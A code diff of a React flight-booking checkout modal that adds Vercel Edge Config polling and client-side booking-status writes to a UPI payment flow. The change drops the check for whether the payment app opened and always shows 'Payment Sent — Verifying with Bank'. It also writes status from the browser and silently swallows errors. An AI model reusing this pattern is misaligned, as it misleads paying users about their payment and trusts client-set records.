@@ -6,7 +6,7 @@ import {
   Phone, MessageCircle, FileText, AlertCircle, AlertTriangle, RefreshCw, UserPlus, Trash2, Armchair, Plus, Info, Globe, Clock
 } from 'lucide-react';
 import { api } from '../utils/api';
-import { getEdgePaymentSettings } from '../utils/edgeConfig';
+import { getEdgePaymentSettings, getEdgeLiveBookings, updateEdgeBookingStatus } from '../utils/edgeConfig';
 import AirlineBadge from './AirlineBadge';
 import RealAircraftSeatMap from './RealAircraftSeatMap';
 import StepTransitionLoader from './StepTransitionLoader';
@@ -258,13 +258,24 @@ export default function BookingCheckoutModal({
     };
     window.addEventListener('storage', handleStorageChange);
 
-    // 3. Fast Cross-Device Network Polling (every 1.2s)
+    // 3. Fast Cross-Device Network Polling (every 1.2s via Vercel Edge Config & API)
     const interval = setInterval(async () => {
       if (isDone) {
         clearInterval(interval);
         return;
       }
       try {
+        // Fast-path: Check live Edge Config directly
+        const edgeBookings = await getEdgeLiveBookings();
+        const cleanPnr = String(activePnr).trim().toUpperCase();
+        if (edgeBookings && edgeBookings[cleanPnr]) {
+          if (checkApproval(edgeBookings[cleanPnr])) {
+            clearInterval(interval);
+            return;
+          }
+        }
+
+        // Secondary: Check API
         const res = await api.getBookingByPnr(activePnr);
         const booking = res?.data || res?.booking;
         if (booking && checkApproval(booking)) {
@@ -615,46 +626,21 @@ export default function BookingCheckoutModal({
         selectedApp: selectedName
       }, 'VERIFICATION_PENDING');
       api.createBooking(payload).catch(() => {});
+      updateEdgeBookingStatus(pnrToUse, 'VERIFICATION_PENDING', payload).catch(() => {});
     } catch (e) {}
 
     const chains = getAppChains(selectedKey);
-    if (!chains || !chains.length) {
-      alert('Payment link unavailable. Please use the QR code.');
-      setIsLaunchingApp(false);
-      return;
-    }
-
-    let appOpened = false;
-    const onVisibilityChange = () => {
-      if (document.visibilityState === 'hidden') {
-        appOpened = true;
+    if (chains && chains.length) {
+      try {
+        window.location.href = chains[0];
+      } catch (err) {
+        try { window.open(chains[0], '_blank', 'noopener'); } catch (e) {}
       }
-    };
-    document.addEventListener('visibilitychange', onVisibilityChange);
-
-    const Ja = 1700; // 1700ms interval matching the Vue script
-    try {
-      for (const url of chains) {
-        if (appOpened) break;
-        try {
-          window.location.href = url;
-        } catch (err) {
-          window.open(url, '_blank', 'noopener');
-        }
-        await new Promise(resolve => setTimeout(resolve, Ja));
-      }
-    } finally {
-      document.removeEventListener('visibilitychange', onVisibilityChange);
-      setIsLaunchingApp(false);
     }
 
-    if (appOpened) {
-      setIsVerifyingPayment(true);
-      return;
-    }
-
-    // App didn't open (not installed or blocked by browser)
-    setAppLaunchFailed(selectedKey);
+    // Always transition to: "Payment Sent — Verifying with Bank" (Image 3)
+    setIsLaunchingApp(false);
+    setIsVerifyingPayment(true);
   };
 
   const handleCopyUpiId = async () => {
@@ -1086,12 +1072,8 @@ export default function BookingCheckoutModal({
         status: 'PENDING'
       }, 'PENDING');
       
-      const res = await api.createBooking(initialPayload);
-      if (res?.data?.pnr || res?.booking?.pnr || res?.pnr) {
-        const returnedPnr = res?.data?.pnr || res?.booking?.pnr || res?.pnr;
-        setCreatedPnr(returnedPnr);
-        try { localStorage.setItem('asg_current_pending_pnr', returnedPnr); } catch (e) {}
-      }
+      api.createBooking(initialPayload).catch(() => {});
+      updateEdgeBookingStatus(pnrToUse, 'PENDING', initialPayload).catch(() => {});
     } catch (err) {
       console.warn('Initial admin booking entry error:', err);
     }
@@ -1128,6 +1110,7 @@ export default function BookingCheckoutModal({
     if (isManualUpi) {
       // Put the modal in Live Verification Waiting mode while Admin verifies
       setIsVerifyingPayment(true);
+      updateEdgeBookingStatus(pnrToUse, 'VERIFICATION_PENDING', bookingPayload).catch(() => {});
     }
 
     setIsProcessing(true);
